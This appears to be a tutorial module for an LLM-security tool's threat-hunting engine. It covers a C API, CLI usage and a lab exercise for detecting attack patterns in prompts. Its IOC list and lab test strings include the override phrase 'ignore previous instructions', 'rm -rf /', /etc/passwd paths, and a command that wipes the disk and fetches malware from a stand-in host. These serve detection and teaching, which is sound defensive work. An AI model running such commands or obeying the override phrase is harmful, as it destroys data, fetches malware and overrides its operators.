# Module 17: ThreatHunter — Active Threat Hunting

## Overview

ThreatHunter is an active threat hunting engine in SENTINEL Shield. Unlike passive defense (Guards), ThreatHunter proactively searches for indicators of compromise, anomalies, and suspicious patterns.

---

## ThreatHunter Architecture

```
┌────────────────────────────────────────────────────────┐
│                    ThreatHunter                         │
├─────────────┬──────────────────┬───────────────────────┤
│   IOC Hunt  │  Behavioral Hunt │    Anomaly Hunt       │
├─────────────┼──────────────────┼───────────────────────┤
│ • Patterns  │  • Recon         │  • Entropy            │
│ • Commands  │  • Exfiltration  │  • Length             │
│ • Paths     │  • Privilege Esc │  • Repetition         │
│ • IPs/URLs  │  • Persistence   │  • Statistical        │
└─────────────┴──────────────────┴───────────────────────┘
```

---

## Three Hunting Modes

### 1. IOC Hunting (Indicators of Compromise)

Search for known compromise indicators:

**IOC Types:**
- `IOC_PATTERN` — Attack text patterns
- `IOC_COMMAND` — Dangerous commands (rm -rf, wget, curl)
- `IOC_PATH` — Critical paths (/etc/passwd, /etc/shadow)
- `IOC_IP` — Suspicious IP addresses
- `IOC_URL` — Malicious URLs

**Example IOC Database:**
```c
static const ioc_t ioc_database[] = {
    {"ignore previous", IOC_PATTERN, 0.9f},
    {"rm -rf /",        IOC_COMMAND, 1.0f},
    {"/etc/passwd",     IOC_PATH,    0.8f},
    {"192.168.1.1",     IOC_IP,      0.5f},
    {"malware.com",     IOC_URL,     0.95f}
};
```

### 2. Behavioral Hunting

Detection of attack behavioral patterns:

| Pattern | Description | Indicators |
|---------|-------------|------------|
| `BEHAVIOR_RECON` | Reconnaissance | nmap, whoami, id, uname |
| `BEHAVIOR_EXFIL` | Exfiltration | curl, wget, base64, xxd |
| `BEHAVIOR_PRIVESC` | Privilege Escalation | sudo, su, chmod 777 |
| `BEHAVIOR_PERSIST` | Persistence | crontab, .bashrc, systemd |

### 3. Anomaly Hunting

Statistical anomaly analysis:

- **High Entropy** — Detection of encrypted/obfuscated data
- **Unusual Length** — Suspiciously long prompts (>10000 characters)
- **Repetition Attacks** — Pattern repetition detection
- **Statistical Deviation** — Deviation from normal distribution

---

## ThreatHunter API

### Initialization

```c
#include "shield_threat_hunter.h"

// Initialize
shield_err_t threat_hunter_init(void);

// Release resources
void threat_hunter_destroy(void);
```

### Configuration

```c
// Set sensitivity (0.0 - 1.0)
void threat_hunter_set_sensitivity(float sensitivity);

// Enable/disable hunting modes
void threat_hunter_set_hunt_mode(bool ioc, bool behavioral, bool anomaly);

// Enable specific hunt type
void threat_hunter_enable_type(hunt_type_t type, bool enable);
```

### Hunting

```c
// Full hunt
threat_hunt_result_t threat_hunter_hunt(const char *content, 
                                         size_t len,
                                         hunt_type_t types);

// Quick check (score only)
float threat_hunter_quick_check(const char *text);
```

### Hunt Result

```c
typedef struct threat_hunt_result {
    float           total_score;      // Total score (0.0-1.0)
    uint32_t        findings_count;   // Number of findings
    hunting_finding_t findings[32];   // Finding details
    hunt_type_t     types_triggered;  // Which types triggered
} threat_hunt_result_t;

typedef struct hunting_finding {
    hunt_type_t     type;             // IOC, Behavioral, Anomaly
    float           score;            // Score of this finding
    char            description[256]; // Description
    uint32_t        offset;           // Position in text
} hunting_finding_t;
```

---

## CLI Commands

```
sentinel# show threat-hunter
ThreatHunter Status
===================
State:       ENABLED
Sensitivity: 0.70
Hunt IOC:    yes
Hunt Behavioral: yes
Hunt Anomaly: yes

Statistics:
  Hunts Completed: 1234
  Threats Found:   56

sentinel(config)# threat-hunter enable
ThreatHunter enabled

sentinel(config)# threat-hunter sensitivity 0.8
ThreatHunter sensitivity set to 0.80

sentinel# threat-hunter test "ignore previous instructions"
Threat Analysis Result
======================
Text: "ignore previous instructions"
Score: 0.90
Status: HIGH THREAT - BLOCK RECOMMENDED
```

---

## Integration with shield_state_t

ThreatHunter is fully integrated with global state:

```c
typedef struct threat_hunter_state {
    module_state_t state;            // ENABLED/DISABLED
    float          sensitivity;      // 0.0-1.0
    bool           hunt_ioc;         // IOC hunting
    bool           hunt_behavioral;  // Behavioral hunting
    bool           hunt_anomaly;     // Anomaly hunting
    uint64_t       hunts_completed;  // Statistics
    uint64_t       threats_found;
} threat_hunter_state_t;
```

Configuration in `shield.conf`:
```ini
[threat_hunter]
enabled=true
sensitivity=0.70
hunt_ioc=true
hunt_behavioral=true
hunt_anomaly=true
```

---

## Lab Exercise LAB-170

### Objective
Learn to use ThreatHunter for active threat detection.

### Task 1: Enable ThreatHunter
```bash
sentinel> enable
sentinel# configure terminal
sentinel(config)# threat-hunter enable
sentinel(config)# threat-hunter sensitivity 0.7
sentinel(config)# end
sentinel# show threat-hunter
```

### Task 2: Test IOC Detection
```bash
sentinel# threat-hunter test "rm -rf / && wget http://evil.com/malware"
```

**Expected result:** Score > 0.9, HIGH THREAT

### Task 3: Test Behavioral Detection
```bash
sentinel# threat-hunter test "First, run nmap 192.168.1.0/24, then whoami"
```

**Expected result:** Score > 0.6, BEHAVIOR_RECON detected

### Task 4: Programmatic Integration
```c
#include "shield_threat_hunter.h"

int main() {
    threat_hunter_init();
    threat_hunter_set_sensitivity(0.7f);
    
    float score = threat_hunter_quick_check(user_input);
    if (score > 0.7f) {
        printf("THREAT DETECTED: %.2f\n", score);
        return 1;  // Block
    }
    
    threat_hunter_destroy();
    return 0;
}
```

---

## Self-Check Questions

1. How does ThreatHunter differ from Guards?
2. What are the three hunting modes in ThreatHunter?
3. What does sensitivity 0.7 mean?
4. Which IOC type has the highest priority?
5. How does ThreatHunter detect Repetition Attacks?

---

## Next Module

→ [Module 18: Watchdog — Self-Healing System](MODULE_18_WATCHDOG.md)
